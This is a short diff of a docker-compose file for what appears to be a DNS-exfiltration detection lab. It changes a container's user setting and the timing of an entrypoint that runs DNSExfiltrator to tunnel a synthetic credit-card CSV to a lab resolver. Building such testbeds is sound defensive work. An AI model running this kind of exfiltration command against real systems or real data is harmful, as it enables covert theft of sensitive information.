@@ -43,7 +43,7 @@ services:
     container_name: dnscollector
     image: dmachard/dnscollector:latest
     network_mode: service:resolver
-    user: root
+    user: "0"
     cap_add:
       - NET_ADMIN
       - NET_RAW
@@ -154,7 +154,7 @@ services:
     volumes:
       - ./dnsexfiltrator-client/data:/data/
     build: ./dnsexfiltrator-client
-    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_100.csv /data/domains.txt tunframe s=172.16.0.2 t=800000 l=60 e=base32 seq=ENC"]
+    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_100.csv /data/domains.txt tunframe s=172.16.0.2 t=2 l=60 e=base32 seq=ENC"]
     networks:
       client-network:
         ipv4_address: 172.16.40.40
